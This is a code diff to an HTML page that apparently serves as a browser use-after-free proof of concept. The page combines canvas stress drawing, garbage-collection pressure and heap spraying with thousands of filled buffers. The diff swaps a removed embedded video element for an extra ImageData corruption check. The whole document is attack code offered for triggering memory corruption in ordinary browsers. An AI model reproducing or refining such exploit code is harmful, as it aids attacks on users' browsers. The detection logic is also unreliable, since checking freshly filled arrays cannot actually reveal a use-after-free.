@@ -16,7 +16,7 @@
             font-weight: bold;
             color: darkred;
         }
-        #canvas, #video {
+        #canvas {
             display: none;
         }
     </style>
@@ -27,11 +27,9 @@
     <button id="trigger">Trigger PoC</button>
     <div id="status">Idle...</div>
     <canvas id="canvas" width="512" height="512"></canvas>
-    <video id="video" loopend="1" src="data:video/mp4;base64,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"></video>
     <script>
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
-        const video = document.getElementById('video');
         const status = document.getElementById('status');
         let attemptCount = 0;
 
@@ -43,7 +41,7 @@
 
         function sprayHeap() {
             const arrays = [];
-            for (let i = 0; i < 8000; i++) {
+            for (let i = 0; i < 12000; i++) {
                 const buf = new Uint8Array(4096);
                 buf.fill(0x44);
                 arrays.push(buf);
@@ -65,45 +63,65 @@
             ctx.putImageData(imageData, 0, 0);
         }
 
+        function checkImageDataUAF(imageData) {
+            const original = new Uint8Array(imageData.data);
+            ctx.putImageData(imageData, 0, 0);
+            const current = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
+            for (let i = 0; i < original.length; i++) {
+                if (original[i] !== current[i]) {
+                    return true; // UAF detected
+                }
+            }
+            return false;
+        }
+
         function triggerExploit() {
             attemptCount++;
             status.textContent = `Attempt ${attemptCount} in progress...`;
 
             try {
-                // Intensive drawing
-                const drawInterval = setInterval(drawOnCanvas, 2);
-
-                // Stress with multiple ImageData operations
-                const imageData = ctx.createImageData(512, 512);
-                for (let i = 0; i < imageData.data.length; i++) {
-                    imageData.data[i] = Math.random() * 255;
+                // Create reference ImageData
+                const refImageData = ctx.createImageData(512, 512);
+                for (let i = 0; i < refImageData.data.length; i++) {
+                    refImageData.data[i] = 0x46;
                 }
-                ctx.putImageData(imageData, 0, 0);
+
+                // Intensive drawing
+                const drawInterval = setInterval(drawOnCanvas, 1);
 
                 // Check for UAF
                 setTimeout(() => {
+                    // First UAF check (buffer)
                     const testBuf = new Uint8Array(4096);
                     testBuf.fill(0x46);
                     if (testBuf[0] !== 0x46) {
                         status.textContent = 'Early UAF detected!';
                         clearInterval(drawInterval);
-                        video.pause();
                         return;
                     }
+
+                    // Second UAF check (ImageData)
+                    if (checkImageDataUAF(refImageData)) {
+                        status.textContent = 'ImageData UAF detected!';
+                        clearInterval(drawInterval);
+                        return;
+                    }
+
                     stressGC();
                     const arrays = sprayHeap();
+
+                    // Third UAF check (buffer after spray)
                     const testBuf2 = new Uint8Array(4096);
                     testBuf2.fill(0x47);
                     if (testBuf2[0] !== 0x47) {
                         status.textContent = 'Second UAF detected!';
                         clearInterval(drawInterval);
-                        video.pause();
                         return;
                     }
+
                     status.textContent = 'Exploit attempted!';
                     clearInterval(drawInterval);
-                    video.pause();
-                }, 300);
+                }, 200);
             } catch (err) {
                 console.error(`Error: ${err.message}`);
                 status.textContent = `Failed: ${err.message}`;
@@ -112,7 +130,6 @@
 
         document.getElementById('trigger').addEventListener('click', () => {
             try {
-                video.play();
                 triggerExploit();
             } catch (err) {
                 console.error(`Error: ${err.message}`);
